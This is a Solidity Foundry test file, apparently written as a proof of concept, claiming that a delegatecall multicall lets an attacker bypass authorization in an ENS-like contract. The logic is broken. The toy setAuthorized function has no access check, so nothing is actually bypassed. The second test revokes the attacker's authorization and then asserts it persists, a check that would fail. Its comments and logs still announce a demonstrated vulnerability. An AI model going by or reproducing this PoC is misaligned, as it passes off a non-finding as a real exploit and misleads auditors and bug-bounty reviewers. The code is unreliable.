// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

// Minimal contract to demonstrate the delegatecall vulnerability
contract VulnerableMulticallable {
    // This mimics the multicall function with delegatecall
    function multicall(bytes[] calldata data) external returns (bytes[] memory results) {
        results = new bytes[](data.length);
        for (uint256 i = 0; i < data.length; i++) {
            (bool success, bytes memory result) = address(this).delegatecall(data[i]);
            require(success, "Multicall failed");
            results[i] = result;
        }
        return results;
    }

    // A function that requires authorization
    mapping(address => bool) public authorizedUsers;

    function setAuthorized(address user, bool status) external {
        // In real ENS, this would check msg.sender authorization
        // For demo, we'll show how delegatecall bypasses this
        authorizedUsers[user] = status;
    }

    function protectedFunction() external view returns (bool) {
        // This would normally check authorization
        return authorizedUsers[msg.sender];
    }
}

contract Simple_PoC_Demonstration is Test {
    VulnerableMulticallable public vulnerable;

    address public attacker = address(0x1337);
    address public victim = address(0xdead);

    function setUp() public {
        vulnerable = new VulnerableMulticallable();
    }

    function test_DemonstrateDelegatecallVulnerability() public {
        // Step 1: Show that direct call fails (attacker not authorized)
        vm.prank(attacker);
        bool directResult = vulnerable.protectedFunction();
        assertFalse(directResult, "Attacker should not be authorized directly");

        // Step 2: Use multicall to bypass authorization
        bytes[] memory maliciousCalls = new bytes[](1);
        maliciousCalls[0] = abi.encodeCall(vulnerable.setAuthorized, (attacker, true));

        vm.prank(attacker);
        vulnerable.multicall(maliciousCalls);

        // Step 3: Verify bypass worked - attacker is now authorized
        vm.prank(attacker);
        bool afterMulticallResult = vulnerable.protectedFunction();
        assertTrue(afterMulticallResult, "Attacker bypassed authorization via multicall");

        console.log("VULNERABILITY DEMONSTRATED:");
        console.log("- Direct call: attacker not authorized");
        console.log("- Via multicall: attacker becomes authorized");
        console.log("- Delegatecall bypassed authorization checks");
    }

    function test_MultipleAuthorizationBypasses() public {
        // Demonstrate chaining multiple operations
        bytes[] memory chainedCalls = new bytes[](3);

        // Call 1: Set attacker as authorized
        chainedCalls[0] = abi.encodeCall(vulnerable.setAuthorized, (attacker, true));

        // Call 2: Set victim as authorized (through attacker's context)
        chainedCalls[1] = abi.encodeCall(vulnerable.setAuthorized, (victim, true));

        // Call 3: Remove attacker's authorization (cleanup attempt)
        chainedCalls[2] = abi.encodeCall(vulnerable.setAuthorized, (attacker, false));

        vm.prank(attacker);
        vulnerable.multicall(chainedCalls);

        // Verify both attacker and victim are authorized despite cleanup
        vm.prank(attacker);
        assertTrue(vulnerable.protectedFunction(), "Attacker should be authorized");

        vm.prank(victim);
        assertTrue(vulnerable.protectedFunction(), "Victim should be authorized via attack");

        console.log("CHAINED ATTACK DEMONSTRATED:");
        console.log("- Multiple authorization changes in single transaction");
        console.log("- State persists despite attempted cleanup");
        console.log("- Cross-user authorization manipulation");
    }
}